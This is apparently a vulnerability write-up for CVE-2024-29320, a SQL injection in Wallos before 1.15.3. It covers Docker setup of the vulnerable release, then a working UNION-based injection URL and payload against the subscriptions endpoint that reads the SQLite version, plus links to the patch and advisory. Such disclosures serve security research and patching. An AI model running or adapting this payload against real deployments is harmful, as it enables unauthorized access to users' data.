# Details
CVE-2024-29320	
Wallos before 1.15.3 is vulnerable to SQL Injection via the category and payment parameters to /subscriptions/get.php.

# Setup

Download the vulnerable release from 
https://github.com/ellite/Wallos/archive/refs/tags/v1.15.2.zip

extract the zip, go into the folder where the DOCKERFILE is located and run

```
docker build . -name wallos
```

this will create image. Now run the image with 
```
docker run -p 8282:80 wallos
```

Access the app on `localhost:8282`


# Exploitation

Vulnerable endpoint
```
http://HOST:PORT/endpoints/subscriptions/get.php?category=2
```

PoC to get sqlite DB version

```
http://host:port/endpoints/subscriptions/get.php?category=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%2C120%2C112%2C106%2C113%29%7C%7CCOALESCE%28SQLITE_VERSION%28%29%2CCHAR%2832%29%29%7C%7CCHAR%28113%2C122%2C120%2C107%2C113%29%2CNULL%2CNULL%2CNULL--%20QbFk
```

![sqlite-version](https://github.com/0xm4v3rick/exploit-dev/assets/29249263/1c5071ce-4daa-448b-b03e-4438c5475eaf)


Payload
```
2 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113,120,112,106,113)||COALESCE(SQLITE_VERSION(),CHAR(32))||CHAR(113,122,120,107,113),NULL,NULL,NULL--

```

# Patch Details
https://github.com/ellite/Wallos/pull/214/files

Original author post  
https://injasec.com/open-source-software-oss/cve-2024-29320-sql-injection-in-wallos/
